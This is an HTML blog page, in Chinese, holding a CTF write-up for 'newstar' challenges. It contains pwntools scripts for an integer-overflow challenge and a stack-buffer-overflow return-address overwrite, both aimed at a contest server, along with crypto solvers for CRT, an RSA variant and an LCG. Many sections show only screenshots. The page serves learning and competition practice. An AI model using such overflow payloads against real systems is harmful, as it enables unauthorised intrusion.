@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>newstar Writeup - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=CTF" class="tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">#CTF</a>
+    <a href="../tags/list.html?tag=Pwn" class="tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">#Pwn</a>
+    <a href="../tags/list.html?tag=Crypto" class="tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">#Crypto</a>
+    <a href="../tags/list.html?tag=MISC" class="tag" style="background:#f9731622;color:#f97316;border:1px solid #f9731644">#MISC</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 05 / 31</div>
+  <div class="post-title">newstar Writeup</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CTF</span>
+    <span class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">Pwn</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">Crypto</span>
+    <span class="post-tag" style="background:#f9731622;color:#f97316;border:1px solid #f9731644">MISC</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h3"><a href="#multi-headach3">multi-headach3</a></li>
+    <li class="toc-h3"><a href="#gdb">GNU Debugger</a></li>
+    <li class="toc-h3"><a href="#intbug">INTbug — 整数溢出</a></li>
+    <li class="toc-h3"><a href="#pwns-door">pwn's door</a></li>
+    <li class="toc-h3"><a href="#overflow">Overflow — 栈溢出</a></li>
+    <li class="toc-h3"><a href="#misc">MISC — 压缩</a></li>
+    <li class="toc-h3"><a href="#ns2025">ns2025</a></li>
+    <li class="toc-h3"><a href="#crt">唯一提示 — CRT</a></li>
+    <li class="toc-h3"><a href="#gcd">小算 — 辗转相减法</a></li>
+    <li class="toc-h3"><a href="#rsa">认识 RSA — p³·q²</a></li>
+    <li class="toc-h3"><a href="#lcg">杂乱之音 1 — LCG</a></li>
+    <li class="toc-h3"><a href="#sagemath">Sagemath 使用指北</a></li>
+    <li class="toc-h3"><a href="#ez-fence">EZ_fence — 栅栏密码</a></li>
+  </ul>
+</nav>
+
+<h3 id="multi-headach3">multi-headach3</h3>
+
+<p><img src="../assets/nw_image002.png" alt="multi-headach3 题目" style="max-width:100%"></p>
+<p><img src="../assets/nw_image004.png" alt="multi-headach3 2" style="max-width:100%"></p>
+<p><img src="../assets/nw_image006.png" alt="multi-headach3 3" style="max-width:100%"></p>
+<p><img src="../assets/nw_image008.png" alt="multi-headach3 4" style="max-width:100%"></p>
+<p><img src="../assets/nw_image010.png" alt="multi-headach3 5" style="max-width:100%"></p>
+
+<p>在看小W的故事，1：</p>
+
+<p><img src="../assets/nw_image012.png" alt="小W的故事 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image014.png" alt="小W的故事 2" style="max-width:100%"></p>
+
+<p>每次循环：</p>
+
+<p><img src="../assets/nw_image016.png" alt="循环 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image018.png" alt="循环 2" style="max-width:100%"></p>
+
+<h3 id="gdb">GNU Debugger</h3>
+
+<p><img src="../assets/nw_image019.png" alt="GDB 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image021.png" alt="GDB 2" style="max-width:100%"></p>
+<p><img src="../assets/nw_image023.png" alt="GDB 3" style="max-width:100%"></p>
+<p><img src="../assets/nw_image025.png" alt="GDB 4" style="max-width:100%"></p>
+<p><img src="../assets/nw_image026.png" alt="GDB 5" style="max-width:100%"></p>
+<p><img src="../assets/nw_image028.png" alt="GDB 6" style="max-width:100%"></p>
+<p><img src="../assets/nw_image029.png" alt="GDB 7" style="max-width:100%"></p>
+<p><img src="../assets/nw_image030.png" alt="GDB 8" style="max-width:100%"></p>
+<p><img src="../assets/nw_image032.png" alt="GDB 9" style="max-width:100%"></p>
+<p><img src="../assets/nw_image033.png" alt="GDB 10" style="max-width:100%"></p>
+<p><img src="../assets/nw_image035.png" alt="GDB 11" style="max-width:100%"></p>
+<p><img src="../assets/nw_image036.png" alt="GDB 12" style="max-width:100%"></p>
+
+<h3 id="intbug">INTbug — 整数溢出</h3>
+
+<p>题目截图：</p>
+
+<p><img src="../assets/nw_image037.png" alt="INTbug 题目" style="max-width:100%"></p>
+
+<p>32767 是关键。32767 是 short int 的最大值（2<sup>15</sup>-1），当输入超过此值时会发生整数溢出。</p>
+
+<p>Exploit 脚本（循环发送 32678 次 payload）：</p>
+
+<pre><code>from pwn import *
+
+p = remote('8.147.134.121', 28846)
+i = 0
+while i &lt; 32678:
+    i = i + 1
+    p.sendline('32678')
+p.interactive()</code></pre>
+
+<p><img src="../assets/nw_image038.png" alt="INTbug 结果" style="max-width:100%"></p>
+
+<h3 id="pwns-door">pwn's door</h3>
+
+<p><img src="../assets/nw_image040.png" alt="pwn's door 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image042.png" alt="pwn's door 2" style="max-width:100%"></p>
+
+<h3 id="overflow">Overflow — 栈溢出</h3>
+
+<p><img src="../assets/nw_image044.png" alt="Overflow 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image046.png" alt="Overflow 2" style="max-width:100%"></p>
+<p><img src="../assets/nw_image048.png" alt="Overflow 3" style="max-width:100%"></p>
+
+<p>Exploit 脚本：</p>
+
+<pre><code>from pwn import *
+
+target = 0x401200
+padding = 0x100 + 0x08
+payload = b'a' * padding + p64(target)
+# p = process('./overflow')
+p = remote('8.147.134.121', 32966)
+p.recvline('Enter your input:')
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<p><img src="../assets/nw_image050.png" alt="Overflow 结果" style="max-width:100%"></p>
+
+<h3 id="misc">MISC — 压缩</h3>
+
+<p>MISC 是-压缩</p>
+
+<h3 id="ns2025">ns2025</h3>
+
+<p><img src="../assets/nw_image052.png" alt="ns2025" style="max-width:100%"></p>
+
+<h3 id="crt">唯一提示 — 中国剩余定理 (CRT)</h3>
+
+<pre><code>from sympy.ntheory.modular import crt
+from Crypto.Util.number import long_to_bytes
+
+# 中国剩余定理的余数
+c = [1, 2, 2, 4, 0, 2, 11, 11, 8, 23, 1, 30, 35, 0, 18, 30, 55, 60, 29, 42,
+     8, 13, 49, 11, 69, 26, 8, 73, 84, 67, 100, 9, 77, 72, 127, 49, 57, 74,
+     70, 129, 146, 45, 35, 180, 196, 101, 100, 146, 100, 194, 2, 161, 35, 155]
+
+# 前54个素数
+primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61,
+          67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137,
+          139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211,
+          223, 227, 229, 233, 239, 241, 251]
+
+# CRT重构原始消息
+result, _ = crt(primes, c)
+flag_bytes = long_to_bytes(result)
+flag = flag_bytes.decode()
+
+print("Recovered Flag:", flag)</code></pre>
+
+<p><img src="../assets/nw_image054.png" alt="CRT 结果" style="max-width:100%"></p>
+
+<h3 id="gcd">小算 — 辗转相减法</h3>
+
+<p>实现辗转相减法求最大公约数：</p>
+
+<pre><code>int_a = int(input())
+int_b = int(input())
+while int_b != int_a:
+    if int_a &lt; int_b:
+        int_b = int_b - int_a
+    if int_b &lt; int_a:
+        int_a = int_a - int_b
+print(int_b)</code></pre>
+
+<p><img src="../assets/nw_image056.png" alt="小算 结果" style="max-width:100%"></p>
+
+<h3 id="rsa">认识 RSA — p³·q²</h3>
+
+<p><img src="../assets/nw_image058.png" alt="RSA 题目" style="max-width:100%"></p>
+
+<p>RSA 变种：模数为 p³·q² 形式，已知 P = p ⊕ KEY，KEY = b'crypto'，以及 q 和 q²。</p>
+
+<pre><code>from Crypto.Util.number import *
+import libnum
+
+e = 65537
+KEY = b'crypto'
+P = 8950704257708450266553505566662195919814660677796969745141332884563215887576312397012443714881729945084204600427983533462340628158820681332200645787691506
+p = P ^ (bytes_to_long(KEY))
+p_3 = pow(p, 3)
+
+n = 44446616188218819786207128669544260200786245231084315865332960254466674511396013452706960167237712984131574242297631824608996400521594802041774252109118569706894250996931000927100268277762882754652796291883967540656284636140320080424646971672065901724016868601110447608443973020392152580956168514740954659431174557221037876268055284535861917524270777789465109449562493757855709667594266126482042307573551713967456278514060120085808631486752297737122542989222157016105822237703651230721732928806660755347805734140734412060262304703945060273095463889784812104712104670060859740991896998661852639384506489736605859678660859641869193937584995837021541846286340552602342167842171089327681673432201518271389316638905030292484631032669474635442148203414558029464840768382970333
+q_2 = 61982213210568270612185748617886731405118724467729130551170377643965027976803008994795021303538879209887150459020834416352651233555733131147916935732578468988903191956271657620581769268304684122426254504445470992995796443915931211314308424317422570763672811342244428627611902748881545667897822966086516195129
+q = 7872878330735733566940850001448150488244648123303487765636327185920302910775774719759058816244207321344019485310055466420441567971039960110275934285763627
+c = 42481263623445394280231262620086584153533063717448365833463226221868120488285951050193025217363839722803025158955005926008972866584222969940058732766011030882489151801438753030989861560817833544742490630377584951708209970467576914455924941590147893518967800282895563353672016111485919944929116082425633214088603366618022110688943219824625736102047862782981661923567377952054731667935736545461204871636455479900964960932386422126739648242748169170002728992333044486415920542098358305720024908051943748019208098026882781236570466259348897847759538822450491169806820787193008018522291685488876743242619977085369161240842263956004215038707275256809199564441801377497312252051117441861760886176100719291068180295195677144938101948329274751595514805340601788344134469750781845
+
+phi = (p * p * p - 1) * (q * q - 1)
+d = libnum.invmod(e, phi)
+m = pow(c, d, n)
+print(m)
+print(long_to_bytes(m))</code></pre>
+
+<h3 id="lcg">杂乱之音 1 — LCG</h3>
+
+<p>线性同余生成器 (LCG) 题目，已知递推关系 hint[i+1] = (a · hint[i] + message) % p，从 hint 数组中恢复原始消息：</p>
+
+<pre><code>from Crypto.Util.number import long_to_bytes
+
+a = 295789025762601408173828135835543120874436321839537374211067344874253837225114998888279895650663245853
+p = 516429062949786265253932153679325182722096129240841519231893318711291039781759818315309383807387756431
+hint = [
+    184903644789477348923205958932800932778350668414212847594553173870661019334816268921010695722276438808,
+    289189387531555679675902459817169546843094450548753333994152067745494929208355954578346190342131249104,
+    511308006207171169525638257022520734897714346965062712839542056097960669854911764257355038593653419751,
+    166071289874864336172698289575695453201748407996626084705840173384834203981438122602851131719180238215,
+    147110858646297801442262599376129381380715215676113653296571296956264538908861108990498641428275853815,
+    414834276462759739846090124494902935141631458647045274550722758670850152829207904420646985446140292244
+]
+
+# 使用 hint[0] 和 hint[1] 计算 message
+term = (a * hint[0]) % p
+message_int = (hint[1] - term) % p
+
+# 验证递推关系
+predicted_h2 = (a * hint[1] + message_int) % p
+if predicted_h2 == hint[2]:
+    print("验证成功：预测值匹配 hint[2]")
+else:
+    print("验证失败")
+
+# 验证其余 hint
+for i in range(2, 5):
+    predicted_next = (a * hint[i] + message_int) % p
+    if predicted_next != hint[i + 1]:
+        print(f"验证失败 at i={i}")
+        break
+else:
+    print("所有后续 hint 验证成功")
+
+# 恢复 flag
+flag_bytes = long_to_bytes(message_int)
+try:
+    flag_str = flag_bytes.decode()
+    print(f"恢复的 flag: {flag_str}")
+except UnicodeDecodeError:
+    print("原始字节值:", flag_bytes.hex())</code></pre>
+
+<h3 id="sagemath">Sagemath 使用指北</h3>
+
+<p><img src="../assets/nw_image060.png" alt="Sagemath 使用指北" style="max-width:100%"></p>
+
+<h3 id="ez-fence">EZ_fence — 栅栏密码</h3>
+
+<p><img src="../assets/nw_image062.png" alt="EZ_fence 1" style="max-width:100%"></p>
+<p><img src="../assets/nw_image064.png" alt="EZ_fence 2" style="max-width:100%"></p>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+</script>
+
+</body>
+</html>
